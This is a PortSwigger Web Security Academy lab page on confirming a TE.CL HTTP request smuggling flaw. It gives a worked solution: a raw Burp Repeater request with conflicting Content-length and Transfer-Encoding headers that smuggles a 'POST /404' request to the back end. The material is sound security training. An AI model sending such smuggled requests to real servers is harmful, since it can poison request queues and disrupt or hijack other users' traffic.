# Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

Source: https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-te-cl-via-differential-responses
Fetched: 2026-06-28T09:18:02.107115+00:00

Web Security Academy

Request smuggling

Finding

Lab

Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.

Note

Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

Tip

Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.

Solution

In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.

Using Burp Repeater, issue the following request twice:

POST / HTTP/1.1

Host: YOUR-LAB-ID.web-security-academy.net

Content-Type: application/x-www-form-urlencoded

Content-length: 4

Transfer-Encoding: chunked

5e

POST /404 HTTP/1.1

Content-Type: application/x-www-form-urlencoded

Content-Length: 15

x=1

0

The second request should receive an HTTP 404 response.

Community solutions

Jarno Timmermans

Michael Sommer

Find HTTP request smuggling vulnerabilities using Burp Suite

Try for free
